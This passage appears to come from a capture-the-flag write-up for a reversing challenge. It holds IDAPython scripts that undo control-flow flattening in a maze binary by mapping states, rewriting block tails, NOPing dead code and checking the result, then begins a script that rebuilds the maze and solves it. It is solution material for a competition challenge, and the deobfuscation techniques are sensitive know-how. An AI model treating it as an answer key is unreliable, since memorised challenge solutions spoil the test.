    disp_exit = cnt.most_common(1)[0][0] if cnt else None
    if verbose:
        print("[map] checks=%d  states=%d  blocks=%d  bijective=%s  disp_exit=%s"
              % (len(checks), len(K2B), len(B2K), len(K2B) == len(B2K),
                 hex(disp_exit) if disp_exit else None))
    return K2B, B2K, disp_exit, checks


# ------------------------------------------------- 2. 单块语义 / 后继
def analyse_block(f, b, nxt, K2B, disp_exit):
    consts, conds, inner, exits = [], [], [], []
    ea = b
    while ea < nxt:
        sz = ida_bytes.get_item_size(ea)
        if not (_is_code(ea) and sz):
            ea += 1
            continue
        m = idc.print_insn_mnem(ea)
        if idc.get_operand_type(ea, 1) == idc.o_imm and (m == "mov" or m in CMOV):
            v = idc.get_operand_value(ea, 1) & 0xFFFFFFFF
            if v in K2B:
                consts.append((ea, v))
        if m in JCC | CMOV:
            conds.append((ea, m))
        if m == "jmp":
            t = idc.get_operand_value(ea, 0)
            (inner if b <= t < nxt else exits).append((ea, t))
        if m.startswith("ret"):
            exits.append((ea, None))
        ea += sz
    return dict(start=b, end=nxt, consts=consts,
                succ=list(dict.fromkeys(v for _, v in consts)),
                conds=conds, inner=inner, exits=exits,
                back=any(t == disp_exit for _, t in exits))


# ------------------------------- 3. Hex-Rays 伪代码 -> 去平坦化 C（goto 化）
CASE_RE = re.compile(r"^\s*case\s+(-?\d+)\s*:\s*$")
NUMRE = re.compile(r"^(-?\d+)$")
ASSIGN = re.compile(r"^(\w+)\s*=\s*(-?\d+);$")
STORE = re.compile(r"^\*\s*(\w+)\s*=\s*(.+?);$")
IFRE = re.compile(r"^if\s*\((.*)\)$")


def split_cases(ea):
    cf = ida_hexrays.decompile(ea)
    if cf is None:
        return None, None
    lines = str(cf).split("\n")
    cases, i = {}, 0
    while i < len(lines):
        m = CASE_RE.match(lines[i])
        if not m:
            i += 1
            continue
        body, j = [], i + 1
        while j < len(lines):
            s = lines[j].strip()
            if s in ("break;",) or s.startswith("case ") or s == "default:" or s.startswith("return "):
                break
            body.append(lines[j])
            j += 1
        cases[int(m.group(1)) & 0xFFFFFFFF] = body
        i = j + 1
    return cases, str(cf)


def emit_c(ea, B2K, K2B, path):
    """把 switch(state) 的每个 case 体按基本块地址（=执行序）重排成 goto 形式。"""
    cases, full = split_cases(ea)
    if cases is None:
        return None
    out = ["/* ===== de-flattened pseudocode: %s @ %X  (%d states) ===== */"
           % (idc.get_func_name(ea), ea, len(cases)),
           "/* case 体按基本块地址(=执行序)重排, 状态写入改写为 goto */",
           "/* 状态表: */"]
    for K in sorted(cases, key=lambda k: K2B.get(k, 1 << 64)):
        out.append("/*   L_%08X  state=%-11d block=%s */" % (K, K, hex(B2K[K]) if K in B2K else "?"))
    out.append("")
    stats = dict(one=0, two=0, unk=0)
    for K in sorted(cases, key=lambda k: K2B.get(k, 1 << 64)):
        body = [l for l in cases[K]]
        while body and not body[-1].strip():
            body.pop()
        succ, cond = [], None
        if body:
            s = STORE.match(body[-1].strip())
            if s:
                var, rhs = s.group(1), s.group(2).strip()
                body.pop()
                if NUMRE.match(rhs):
                    succ = [int(rhs) & 0xFFFFFFFF]
                else:
                    idx = [t for t, ln in enumerate(body)
                           if ASSIGN.match(ln.strip()) and ASSIGN.match(ln.strip()).group(1) == rhs]
                    nums = [(t, int(ASSIGN.match(body[t].strip()).group(2)) & 0xFFFFFFFF) for t in idx]
                    if len(nums) >= 2:
                        succ = [nums[0][1], nums[1][1]]
                        for t in range(nums[1][0] - 1, -1, -1):
                            mm = IFRE.match(body[t].strip())
                            if mm:
                                cond = mm.group(1)
                                break
                        body = body[:nums[0][0]]
                    elif nums:
                        succ = [nums[0][1]]
                        body = body[:nums[0][0]]
        out.append("/* ------------------------------------------------------------------ */")
        out.append("L_%08X:   /* block %s   next: %s */"
                   % (K, hex(B2K[K]) if K in B2K else "?",
                      " ".join("L_%08X" % s for s in succ) or "?（无状态写入: return/尾块）"))
        for ln in body:
            if ln.strip():
                out.append("    " + ln.strip())
        if len(succ) == 1:
            out.append("    goto L_%08X;" % succ[0])
            stats["one"] += 1
        elif len(succ) >= 2:
            if cond:
                out.append("    if ( %s ) goto L_%08X;   /* else 落到 */" % (cond, succ[1]))
                out.append("    goto L_%08X;" % succ[0])
            else:
                out.append("    /* 两个后继，条件未解析: %s */" % " / ".join("L_%08X" % s for s in succ))
            stats["two"] += 1
        else:
            out.append("    /* 无后继常量 */")
            stats["unk"] += 1
        out.append("")
    open(path, "w", encoding="utf-8").write("\n".join(out))
    print("[c] cases=%d  goto 单后继=%d  条件双后继=%d  未解析=%d"
          % (len(cases), stats["one"], stats["two"], stats["unk"]))
    return cases


# --------------------------------------------------------------- 4. 主流程
def run(ea=0x140001000, outdir=None):
    f = ida_funcs.get_func(ea)
    if f is None:
        return None
    outdir = outdir or OUTDIR
    name = re.sub(r"\W+", "_", idc.get_func_name(ea))
    K2B, B2K, disp_exit, checks = build_state_map(f)

    entry_state = None
    for e, sz, m, t, insn in _items(f, f.start_ea, min(f.end_ea, f.start_ea + 0x200)):
        if m == "mov" and idc.get_operand_type(e, 1) == idc.o_imm \
           and idc.get_operand_type(e, 0) in (idc.o_displ, idc.o_mem):
            v = idc.get_operand_value(e, 1) & 0xFFFFFFFF
            if v in K2B:
                entry_state = v
                break
    if entry_state is None and K2B:
        entry_state = min(K2B, key=lambda k: K2B[k])

    # 线性化反汇编：块序 = 地址序 = 执行序
    blocks = sorted(B2K)
    info = {}
    for i, b in enumerate(blocks):
        nxt = blocks[i + 1] if i + 1 < len(blocks) else f.end_ea
        info[b] = analyse_block(f, b, nxt, K2B, disp_exit)
    L = ["; de-flattened listing of %s  [%X - %X]" % (idc.get_func_name(f.start_ea), f.start_ea, f.end_ea),
         "; entry state = %08X -> block %X" % (entry_state, K2B.get(entry_state, 0)), ""]
    for b in blocks:
        d = info[b]
        tag = " -> ".join("st_%08X" % s for s in d["succ"]) or \
              ("return" if any(t is None for _, t in d["exits"]) else "?")
        L.append("; " + "=" * 100)
        L.append("; st_%08X @ %X   next: %s%s" % (B2K[b], b, tag,
                 ("   [cond: %s]" % ",".join(m for _, m in d["conds"])) if d["conds"] else ""))
        L.append("; " + "=" * 100)
        L.append("st_%08X:" % B2K[b])
        ea2 = b
        while ea2 < d["end"]:
            sz = ida_bytes.get_item_size(ea2)
            if _is_code(ea2) and sz:
                L.append("    %016X  %-52s ; %s" % (ea2, idc.generate_disasm_line(ea2, 0),
                                                    ida_bytes.get_bytes(ea2, sz).hex(" ")))
                ea2 += sz
            else:
                L.append("    %016X  db %02X" % (ea2, ida_bytes.get_byte(ea2)))
                ea2 += 1
        L.append("")
    open(os.path.join(outdir, "%s_blocks.txt" % name), "w", encoding="utf-8").write("\n".join(L))

    # Graphviz 状态图
    dot = ["digraph flat {", '  rankdir=TB; node [shape=box, fontname="Consolas"];']
    for b, d in info.items():
        fill = "lightblue" if B2K[b] == entry_state else ("khaki" if len(d["succ"]) > 1 else "white")
        dot.append('  n%X [label="st_%08X\\n%X", style=filled, fillcolor=%s];' % (b, B2K[b], b, fill))
    for b, d in info.items():
        for s in d["succ"]:
            if s in B2K:
                dot.append('  n%X -> n%X [label="%s"];' % (b, B2K[s],
                           "linear" if len(d["succ"]) == 1 else "cc"))
    dot.append("}")
    open(os.path.join(outdir, "%s_flow.dot" % name), "w", encoding="utf-8").write("\n".join(dot))

    cases = emit_c(ea, B2K, K2B, os.path.join(outdir, "%s_deflattened.c" % name))

    one = sum(1 for d in info.values() if len(d["succ"]) == 1)
    two = sum(1 for d in info.values() if len(d["succ"]) == 2)
    seen, stack = set(), ([K2B[entry_state]] if entry_state in K2B else [])
    while stack:
        b = stack.pop()
        if b in seen:
            continue
        seen.add(b)
        for s in info[b]["succ"]:
            if s in K2B:
                stack.append(K2B[s])
    print("[stat] blocks=%d  succ1=%d  succ2=%d  other=%d  entry=%08X->%X  可达=%d/%d"
          % (len(info), one, two, len(info) - one - two, entry_state,
             K2B.get(entry_state, 0), len(seen), len(info)))

    res = dict(name=name, entry_state=entry_state, disp_exit=disp_exit,
               n_states=len(K2B), reachable=sorted(seen),
               K2B={"%08X" % k: v for k, v in K2B.items()},
               B2K={"%X" % k: v for k, v in B2K.items()},
               info={hex(b): dict(state=B2K[b], succ=d["succ"],
                                  conds=[m for _, m in d["conds"]],
                                  inner=[[hex(a), hex(t)] for a, t in d["inner"]],
                                  exits=[[hex(a), (hex(t) if t is not None else None)] for a, t in d["exits"]])
                     for b, d in info.items()})
    open(os.path.join(outdir, "%s_map.json" % name), "w", encoding="utf-8").write(
        json.dumps(res, indent=1))
    return res
```

### 3. 字节级去平坦化：形态校验、改写块尾、NOP 死区间、机械校验

```python
import idc, ida_bytes, ida_funcs, ida_ua, ida_hexrays, ida_auto, ida_ida, ida_xref

MAIN       = 0x140001000
DISP_EXIT  = 0x140003FD2
ENTRY_HEAD = 0x14000102E
PTR_LOAD   = bytes.fromhex("488b8424a0030000")     # mov rax,[rsp+838h+var_498]
STORE_DW   = bytes.fromhex("c700")                 # mov dword ptr [rax], imm32
STORE_RC   = bytes.fromhex("8908")                 # mov [rax], ecx
NOP        = 0x90


# ------------------------------------------------------------------ 工具
def _items(f):
    ea = f.start_ea
    while ea < f.end_ea:
        sz = ida_bytes.get_item_size(ea)
        if ida_bytes.is_code(ida_bytes.get_flags(ea)) and sz:
            yield dict(ea=ea, size=sz, mnem=idc.print_insn_mnem(ea),
                       txt=idc.generate_disasm_line(ea, 0),
                       raw=ida_bytes.get_bytes(ea, sz))
            ea += sz
        else:
            ea += 1


def build_maps(f):
    K2B, B2K = {}, {}
    for ins in _items(f):
        if ins["mnem"] == "sub" and idc.get_operand_type(ins["ea"], 1) == idc.o_imm:
            jz = ins["ea"] + ins["size"]
            if idc.print_insn_mnem(jz) == "jz":
                K = idc.get_operand_value(ins["ea"], 1) & 0xFFFFFFFF
                K2B[K] = idc.get_operand_value(jz, 0)
                B2K[idc.get_operand_value(jz, 0)] = K
    return K2B, B2K


def rel32(src_end, dst):
    """E9/E8 ... 的相对位移（相对下一条指令）"""
    return (dst - src_end) & 0xFFFFFFFF


def jmp_bytes(at, dst):
    return b"\xe9" + rel32(at + 5, dst).to_bytes(4, "little")


def patch(ea, data):
    for i, b in enumerate(data):
        ida_bytes.patch_byte(ea + i, b)


# ------------------------------------------------------ 单块形态解析
def parse_block(f, b, nxt, K2B, B2K):
    """返回 dict(kind='uncond'|'cond'|'terminal', ...) 或 dict(kind='bad', why=...)"""
    seq = [i for i in _items(f) if b <= i["ea"] < nxt]
    if not seq:
        return dict(kind="bad", why="空块", block=b)

    # J: 块内最后一条 jmp disp_exit
    js = [i for i in seq if i["mnem"] == "jmp" and idc.get_operand_value(i["ea"], 0) == DISP_EXIT]
    if not js:
        return dict(kind="terminal", block=b, seq=seq)      # 终止块（return 路径）
    J = js[-1]
    if J is not seq[-1]:
        return dict(kind="bad", why="jmp disp 不是块尾指令", block=b, J=J["ea"])
    if J["raw"][0] not in (0xE9, 0xEB):
        return dict(kind="bad", why="jmp disp 不是 E9/EB", block=b, J=J["ea"])

    idx = {i["ea"]: n for n, i in enumerate(seq)}
    ji = idx[J["ea"]]

    # P: J 之前最后一条 mov rax,[var_498]
    Ps = [i for i in seq[:ji] if i["raw"] == PTR_LOAD]
    if not Ps:
        return dict(kind="bad", why="找不到 mov rax,[var_498]", block=b, J=J["ea"])
    P = Ps[-1]
    pi = idx[P["ea"]]

    if pi + 1 > ji:
        return dict(kind="bad", why="P 之后无存储", block=b)
    S = seq[pi + 1]
    if S["raw"][:2] == STORE_DW and S["size"] == 6:
        store_kind = "imm"
    elif S["raw"] == STORE_RC:
        store_kind = "reg"
    else:
        return dict(kind="bad", why="P 之后不是状态写入 (%s)" % S["txt"], block=b, P=P["ea"])
    si = pi + 1

    # 中间指令 X = S 之后、J 之前
    X = seq[si + 1:ji]

    # 所有状态常量
    consts = []
    for i in seq:
        if i["mnem"] == "mov" and idc.get_operand_type(i["ea"], 1) == idc.o_imm:
            v = idc.get_operand_value(i["ea"], 1) & 0xFFFFFFFF
            if v in K2B:
                consts.append((i["ea"], v))
    succ = list(dict.fromkeys(v for _, v in consts))

    # 条件块?
    C = seq[pi - 1] if pi >= 1 else None
    is_cond = bool(C and C["size"] == 3 and C["raw"][0] == 0x0F and 0x40 <= C["raw"][1] <= 0x4F)

    info = dict(block=b, state=B2K.get(b), J=J["ea"], Jsize=J["size"], P=P["ea"],
                S=S["ea"], Ssize=S["size"], store=store_kind, X=[i["ea"] for i in X],
                succ=succ, seq=seq)
    if not is_cond:
        if len(succ) != 1:
            return dict(kind="bad", why="非条件块但后继=%s" % [hex(s) for s in succ], **info)
        return dict(kind="uncond", **info)

    # ---- 条件块
    if pi < 3:
        return dict(kind="bad", why="P 之前不足 3 条指令", **info)
    T, M2, M1 = seq[pi - 2], seq[pi - 3], seq[pi - 4]
    if not (M1["mnem"] == "mov" and M2["mnem"] == "mov"
            and M1["raw"][0] in range(0xB8, 0xC0) and M2["raw"][0] in range(0xB8, 0xC0)):
        return dict(kind="bad", why="C 之前两条不是 mov r32,imm32", **info)
    K1 = int.from_bytes(M1["raw"][1:5], "little") & 0xFFFFFFFF
    K2 = int.from_bytes(M2["raw"][1:5], "little") & 0xFFFFFFFF
    if K1 not in K2B or K2 not in K2B:
        return dict(kind="bad", why="常量不在状态表 K1=%X K2=%X" % (K1, K2), **info)
    dst1 = M1["raw"][0] - 0xB8
    dst2 = M2["raw"][0] - 0xB8
    modrm = C["raw"][2]
    if (modrm & 0xC0) != 0xC0 or (modrm & 0x38) >> 3 != dst1 or (modrm & 0x07) != dst2:
        return dict(kind="bad", why="cmov 寄存器不对称 (modrm=%02X dst1=%d dst2=%d)" % (modrm, dst1, dst2), **info)
    if T["ea"] + T["size"] != C["ea"]:
        return dict(kind="bad", why="cmov 不紧跟标志设置指令", **info)
    info.update(K1=K1, K2=K2, cc=C["raw"][1] & 0x0F, C=C["ea"], T=T["ea"],
                Ttxt=T["txt"], M1=M1["ea"], M2=M2["ea"], succ=[K1, K2])
    # X 必须可搬运：rsp 相对、纯存储立即数、不读 rax/rcx/eax
    for x in X:
        ok = (x["raw"][:2] == b"\xc6\x84" and x["size"] == 8 and "var_" in x["txt"]
              and "[rsp+" in x["txt"] and x["mnem"] == "mov")
        if not ok:
            return dict(kind="bad", why="X 中含不可搬运指令 %s @%X" % (x["txt"], x["ea"]), **info)
    return dict(kind="cond", **info)


# ------------------------------------------------------------------ dry run
def dry_run(main=MAIN):
    """逐块严格校验块尾形态，任何一块不符就整体拒绝（不合形态的块会中止后续改写）。"""
    f = ida_funcs.get_func(main)
    K2B, B2K = build_maps(f)
    blocks = sorted(B2K)
    reps, bad = [], []
    for i, b in enumerate(blocks):
        nxt = blocks[i + 1] if i + 1 < len(blocks) else f.end_ea
        r = parse_block(f, b, nxt, K2B, B2K)
        r["next_block"] = nxt
        (reps if r["kind"] != "bad" else bad).append(r)

    kinds = {}
    for r in reps:
        kinds[r["kind"]] = kinds.get(r["kind"], 0) + 1
    print("[dry] blocks=%d  形态: %s" % (len(blocks), kinds))
    for r in bad:
        print("      block %X state=%s : %s" % (r.get("block", 0), r.get("state"), r.get("why")))

    eb = ida_bytes.get_bytes(ENTRY_HEAD, 7)
    print("[dry] entry@%X bytes=%s  (期望 mov eax,[var_48C])" % (ENTRY_HEAD, eb.hex(" ")))
    entry_state = 0
    for i in _items(f):
        if i["ea"] > f.start_ea + 0x200:
            break
        if i["mnem"] == "mov" and idc.get_operand_type(i["ea"], 1) == idc.o_imm:
            v = idc.get_operand_value(i["ea"], 1) & 0xFFFFFFFF
            if v in K2B:
                entry_state = v
                break
    print("[dry] entry_state=%08X -> block %X ; 入口补丁后字节 %s"
          % (entry_state, K2B.get(entry_state, 0),
             jmp_bytes(ENTRY_HEAD, K2B[entry_state]).hex(" ") if entry_state else "?"))
    for r in reps:
        if r["kind"] == "cond":
            print("   %X st_%08X  cmov%X -> K2=st_%08X (jcc) / K1=st_%08X ; X=%s ; T=%s"
                  % (r["block"], r["state"], r["cc"], r["K2"], r["K1"],
                     [hex(x) for x in r["X"]], r["Ttxt"].split(";")[0].strip()))
    return dict(K2B=K2B, B2K=B2K, reps=reps, bad=bad, entry_state=entry_state)


# ------------------------------------------------------------------ 死区间
CC_NAME = {0: "o", 1: "no", 2: "b", 3: "ae", 4: "z", 5: "nz", 6: "be", 7: "a",
           8: "s", 9: "ns", 10: "p", 11: "np", 12: "l", 13: "ge", 14: "le", 15: "g"}

JCC = {"jz", "je", "jnz", "jne", "ja", "jnbe", "jb", "jnae", "jae", "jnb", "jnc",
       "jbe", "jna", "jg", "jnle", "jl", "jnge", "jge", "jnl", "jle", "jng",
       "jo", "jno", "js", "jns", "jp", "jpe", "jnp", "jpo", "jrcxz", "jecxz",
       "loop", "loopne", "loope"}
ALWAYS_TAKEN_AFTER_SELFOP = {"jz", "je", "jbe", "jna", "jle", "jae", "jnb", "jnc",
                             "jge", "jnl", "jns", "jno"}
SELFOP = {"xor", "cmp", "sub"}


def _decode_seq(f):
    out, ea = [], f.start_ea
    while ea < f.end_ea:
        sz = ida_bytes.get_item_size(ea)
        if ida_bytes.is_code(ida_bytes.get_flags(ea)) and sz:
            insn = ida_ua.insn_t()
            if ida_ua.decode_insn(insn, ea):
                tgt = None
                if insn.ops and insn.ops[0].type in (ida_ua.o_near, ida_ua.o_far):
                    tgt = insn.ops[0].addr
                out.append(dict(ea=ea, size=sz, mnem=idc.print_insn_mnem(ea), tgt=tgt,
                                txt=idc.generate_disasm_line(ea, 0), insn=insn))
            ea += sz
        else:
            ea += 1
    return out


def _is_selfop(ins):
    if ins is None or ins["mnem"] not in SELFOP:
        return False
    ops = ins["insn"].ops
    if len(ops) < 2:
        return False
    if ops[0].type != ida_ua.o_reg or ops[1].type != ida_ua.o_reg:
        return False
    return ops[0].reg == ops[1].reg


_CC = {"o": 0, "no": 1, "b": 2, "nae": 2, "c": 2, "ae": 3, "nb": 3, "nc": 3,
       "z": 4, "e": 4, "nz": 5, "ne": 5, "be": 6, "na": 6, "a": 7, "nbe": 7,
       "s": 8, "ns": 9, "p": 10, "pe": 10, "np": 11, "po": 11,
       "l": 12, "nge": 12, "ge": 13, "nl": 13, "le": 14, "ng": 14, "g": 15, "nle": 15}


def _cc_code(mnem):
    if not mnem.startswith("j"):
        return None
    return _CC.get(mnem[1:])


def collect_dead_spans(f, max_span=64):
    """找出“跳转跨过的死区间”。返回 [(branch_ea, span_lo, span_hi, why)]"""
    seq = _decode_seq(f)
    tgt_src = {}
    for i in seq:
        if i["tgt"] is not None and f.start_ea <= i["tgt"] < f.end_ea:
            tgt_src.setdefault(i["tgt"], []).append(i["ea"])

    def clean(lo, hi, guard_lo):
        """区间内不得有来自守卫对之外的控制流进入/引用，也不得有命名符号"""
        if not (lo < hi):
            return False
        for t, srcs in tgt_src.items():
            if lo <= t < hi and any(s < guard_lo or s >= hi for s in srcs):
                return False
        if any(idc.get_name(a) for a in range(lo, hi)):
            return False
        for a in range(lo, hi):
            xb = ida_xref.xrefblk_t()
            ok = xb.first_to(a, ida_xref.XREF_ALL)
            while ok:
                if xb.frm < guard_lo or xb.frm >= hi:
                    return False
                ok = xb.next_to()
        return True

    spans = []
    for n, ins in enumerate(seq):
        if ins["tgt"] is None or (ins["mnem"] not in JCC and ins["mnem"] != "jmp"):
            continue
        lo = ins["ea"] + ins["size"]
        hi = ins["tgt"]
        if not (lo < hi <= lo + max_span):
            continue
        prev = seq[n - 1] if n else None
        if ins["mnem"] == "jmp":
            why, guard_lo = "unconditional jmp", ins["ea"]
        elif ins["mnem"] in ALWAYS_TAKEN_AFTER_SELFOP and _is_selfop(prev):
            why, guard_lo = "%s after self-op" % ins["mnem"], prev["ea"]
        else:
            continue
        if not clean(lo, hi, guard_lo):
            continue
        spans.append((ins["ea"], lo, hi, why))

    # 互补 jcc 对： jcc1 T ; jcc2 T  (cc2 == ~cc1)  =>  [jcc2_end, T) 必死
    for n in range(len(seq) - 1):
        a, b = seq[n], seq[n + 1]
        if a["mnem"] not in JCC or b["mnem"] not in JCC:
            continue
        if a["ea"] + a["size"] != b["ea"] or a["tgt"] is None or a["tgt"] != b["tgt"]:
            continue
        ca, cb = _cc_code(a["mnem"]), _cc_code(b["mnem"])
        if ca is None or cb is None or (ca ^ 1) != cb:
            continue
        lo, hi = b["ea"] + b["size"], a["tgt"]
        if not (lo < hi <= lo + max_span):
            continue
        if not clean(lo, hi, a["ea"]):
            continue
        spans.append((b["ea"], lo, hi, "complementary %s/%s pair -> %X" % (a["mnem"], b["mnem"], a["tgt"])))
    # 去重（同一区间只保留一次，取更长的那个）
    spans.sort(key=lambda s: (s[1], -(s[2] - s[1])))
    uniq, seen = [], set()
    for s in spans:
        if any(lo <= s[1] < hi for lo, hi in seen):
            continue
        seen.add((s[1], s[2]))
        uniq.append(s)
    return sorted(uniq, key=lambda s: s[1])


def verify_cfg(rep, main=MAIN):
    """重新解码打过补丁的函数，校验每个块的块间后继 == 原状态机的后继集合"""
    f = ida_funcs.get_func(main)
    K2B, B2K = rep["K2B"], rep["B2K"]
    blocks = sorted(B2K)
    blockset = set(blocks)
    ok, bad, term = 0, [], 0
    for i, b in enumerate(blocks):
        nxt = blocks[i + 1] if i + 1 < len(blocks) else f.end_ea
        got, saw_ret, last_uncond, last_ea = set(), False, False, None
        ea = b
        while ea < nxt:
            sz = ida_bytes.get_item_size(ea)
            if not (ida_bytes.is_code(ida_bytes.get_flags(ea)) and sz):
                ea += 1
                continue
            m = idc.print_insn_mnem(ea)
            if m in ("jz", "jnz", "ja", "jb", "jae", "jbe", "jg", "jl", "jge", "jle",
                     "jo", "jno", "js", "jns", "jp", "jnp", "jmp"):
                t = idc.get_operand_value(ea, 0)
                if t in blockset and not (b <= t < nxt):
                    got.add(t)
            last_uncond = (m == "jmp")
            if m.startswith("ret"):
                saw_ret = True
            last_ea = ea
            ea += sz
        # 落空：块尾不是无条件跳转/返回时，流程自然进入下一个块
        if not last_uncond and not saw_ret and nxt in blockset:
            got.add(nxt)
        r = next(x for x in rep["reps"] if x["block"] == b)
        if r["kind"] == "terminal":
            term += 1
            if not saw_ret:
                bad.append((b, "终止块没有 ret", sorted(got)))
            continue
        expect = set(K2B[s] for s in r["succ"])
        if expect == got:
            ok += 1
        else:
            bad.append((b, "后继不符 期望%s 实际%s" % (sorted(hex(x) for x in expect),
                                                 sorted(hex(x) for x in got))))
    print("[verify] 块间后继一致: %d/%d  (终止块 %d)" % (ok, len(blocks) - term, term))
    for b, why, *rest in bad:
        print("   !! block %X : %s %s" % (b, why, rest))
    return not bad


def nop_dead_spans(dry=True, main=MAIN):
    f = ida_funcs.get_func(main)
    spans = collect_dead_spans(f)
    print("[spans] 死区间 %d 个:" % len(spans))
    for br, lo, hi, why in spans:
        print("   br %X -> 跳过 %X-%X (%d bytes) [%s]  bytes=%s"
              % (br, lo, hi, hi - lo, why, ida_bytes.get_bytes(lo, min(hi - lo, 12)).hex(" ")))
    if dry:
        return spans
    for br, lo, hi, why in spans:
        patch(lo, bytes([NOP]) * (hi - lo))
        ida_bytes.del_items(lo, ida_bytes.DELIT_SIMPLE, hi - lo)
    ida_auto.plan_and_wait(main, f.end_ea)
    ida_auto.auto_wait()
    print("[spans] 已 NOP %d 个死区间" % len(spans))
    return spans


# ------------------------------------------------------------------ 应用
def apply_patches(rep, save=True, verify=True):
    if rep["bad"]:
        print("[apply] 存在不合形态的块，拒绝打补丁")
        return False
    K2B = rep["K2B"]
    plan, ranges, bad = [], [], []
    for r in rep["reps"]:
        if r["kind"] == "terminal":
            continue
        if r["kind"] == "uncond":
            tgt = K2B[r["succ"][0]]
            P, S_end, J, Js = r["P"], r["S"] + r["Ssize"], r["J"], r["Jsize"]
            if Js == 5:
                how = "NOP[P,S) + E9@J"
            elif Js == 2 and J + 2 == tgt:
                how = "NOP[P,S) + NOP@J(落空到后继)"
            elif Js == 2 and -128 <= tgt - (J + 2) <= 127:
                how = "NOP[P,S) + EB 改指向"
            else:
                bad.append((r, "单后继块 J 空间不足"))
                continue
            plan.append(("uncond", r, tgt, how))
            ranges += [(P, S_end), (J, J + Js)]
        else:
            C, tgt2, tgt1 = r["C"], K2B[r["K2"]], K2B[r["K1"]]
            body = b"".join(ida_bytes.get_bytes(x, 8) for x in r["X"])   # 搬运可移动的 X
            n = len(body)
            body += bytes([0x0F, 0x80 | r["cc"]]) + rel32(C + n + 6, tgt2).to_bytes(4, "little")
            body += jmp_bytes(C + len(body), tgt1)
            region_end = r["J"] + r["Jsize"]
            if C + len(body) > region_end:
                bad.append((r, "条件块空间不足"))
                continue
            plan.append(("cond", r, (tgt1, tgt2), "X搬运 + jcc@C + E9@C"))
            ranges.append((C, region_end))

    print("[apply] 计划:")
    for kind, r, tgt, how in plan:
        print("   %-6s block %X st_%08X -> %s   [%s]" % (kind, r["block"], r["state"], tgt, how))
    if bad:
        print("[apply] !! %d 个块无安全补丁方案，整体拒绝:" % len(bad))
        for r, why in bad:
            print("       %X : %s" % (r["block"], why))
        return False

    # ---- 真正写字节
    for kind, r, tgt, how in plan:
        if kind == "uncond":
            P, S_end, J, Js = r["P"], r["S"] + r["Ssize"], r["J"], r["Jsize"]
            patch(P, bytes([NOP]) * (S_end - P))
            if Js == 5:
                patch(J, jmp_bytes(J, tgt))
            elif J + 2 == tgt:
                patch(J, bytes([NOP, NOP]))
            else:
                patch(J, b"\xeb" + bytes([(tgt - (J + 2)) & 0xFF]))
        else:
            C = r["C"]
            body = b"".join(ida_bytes.get_bytes(x, 8) for x in r["X"])
            n = len(body)
            body += bytes([0x0F, 0x80 | r["cc"]]) + rel32(C + n + 6, K2B[r["K2"]]).to_bytes(4, "little")
            body += jmp_bytes(C + len(body), K2B[r["K1"]])
            region_end = r["J"] + r["Jsize"]
            patch(C, body + bytes([NOP]) * (region_end - C - len(body)))
    patch(ENTRY_HEAD, jmp_bytes(ENTRY_HEAD, K2B[rep["entry_state"]]) + bytes([NOP]) * 2)
    ranges.append((ENTRY_HEAD, ENTRY_HEAD + 7))
    for s, e in sorted(ranges):
        ida_bytes.del_items(s, ida_bytes.DELIT_SIMPLE, e - s)
    ida_auto.plan_and_wait(MAIN, 0x140003FD7)
    ida_auto.auto_wait()

    f = ida_funcs.get_func(MAIN)
    if f is None or f.end_ea < 0x140003F00:
        ida_funcs.add_func(MAIN, 0x140003FD7)
        ida_auto.auto_wait()
        f = ida_funcs.get_func(MAIN)
    print("[apply] 完成: %d 个块尾 + 入口已改写; function=%s %X-%X"
          % (len(plan), idc.get_func_name(MAIN) if f else "?",
             f.start_ea if f else 0, f.end_ea if f else 0))
    if verify:
        verify_result()
    if save:
        ok = idc.save_database(ida_ida.get_idb_path(), 0)
        print("[apply] save_database -> %s" % ok)
    return True


def verify_result():
    f = ida_funcs.get_func(MAIN)
    print("\n===== 验证 =====")
    print("function %s  %X-%X  flags=%08X frsize=%s"
          % (idc.get_func_name(MAIN), f.start_ea, f.end_ea, f.flags, hex(f.frsize)))
    cf = ida_hexrays.decompile(MAIN)
    if cf is None:
        print("!! decompile 失败")
        return None
    txt = str(cf)
    print("pseudocode len=%d  JUMPOUT=%d  flagstr=%s  含 'switch'=%s  含 'while ( 1 )'=%d"
          % (len(txt), txt.count("JUMPOUT"), "TSCTF-J{" in txt,
             "switch" in txt, txt.count("while ( 1 )")))
    return txt


# ---- 一段跑完（顺序不能变：先校验形态，再改块尾，再 NOP 死区间，最后机械复核）
def deflatten_main(save=False):
    rep = dry_run()
    spans = nop_dead_spans(dry=True)
    ok = apply_patches(rep, save=save)
    nop_dead_spans(dry=False)
    consistent = verify_cfg(rep)
    return rep, spans, ok, consistent
```

### 4. 静态重建地图 + BFS + MD5（纯标准库，输入就是附件本体）

这段只依赖附件本身：从 `.rdata` 取 391 行行表，用 D 路径的 205 项源行号拼出地图，BFS 出唯一路径，再复算 MD5。索引 `idx = x + 41*y + 41*41*z` 体现在 `rows[41*z + y][x]`。

```python
import collections
import hashlib
import struct

EXE = "MazeGarden.exe"

W, L = 41, 5                       # 结构体 +0x00 W=0x29、+0x08 L=5
START, GOAL = (1, 1, 0), (39, 39, 4)

TABLE_OFF = 0x25D88                # .rdata RVA 0x140027388 -> 文件偏移
TABLE_N = 391                      # 391 条 41 字符行，每条后跟 \0（步长 42）

# D 路径（真实执行的那条）205 个拷贝站点的源行号，站点 205..409 按站点顺序
IDX = [8, 226, 209, 376, 354, 329, 285, 217, 220, 279, 318, 242, 271, 291, 274, 374,
       338, 351, 305, 316, 250, 270, 364, 295, 224, 251, 389, 248, 246, 310, 372, 225,
       227, 215, 380, 236, 273, 353, 377, 307, 8, 8, 269, 239, 301, 200, 240, 198, 327,
       335, 323, 312, 387, 343, 199, 252, 253, 319, 339, 390, 247, 370, 212, 357, 234,
       232, 264, 304, 311, 382, 219, 211, 205, 384, 315, 231, 308, 375, 294, 278, 303,
       8, 8, 202, 363, 348, 260, 241, 298, 223, 356, 207, 345, 360, 245, 208, 297, 349,
       313, 263, 361, 336, 237, 325, 302, 214, 203, 299, 344, 326, 317, 368, 367, 290,
       379, 277, 255, 267, 342, 350, 365, 321, 8, 8, 340, 284, 276, 197, 287, 238, 256,
       381, 233, 385, 259, 373, 268, 261, 341, 322, 288, 262, 221, 272, 230, 204, 254,
       386, 258, 213, 289, 347, 228, 266, 337, 206, 300, 332, 275, 244, 328, 324, 196,
       8, 8, 346, 229, 352, 243, 334, 359, 355, 216, 296, 218, 222, 378, 235, 333, 388,
       281, 282, 306, 309, 286, 331, 249, 257, 280, 265, 293, 314, 369, 283, 383, 371,
       330, 201, 292, 358, 366, 210, 320, 362, 8]

# 自校验 1：源行只来自表行 196..390，加上整行 '#' 的 row 8 复用 10 次
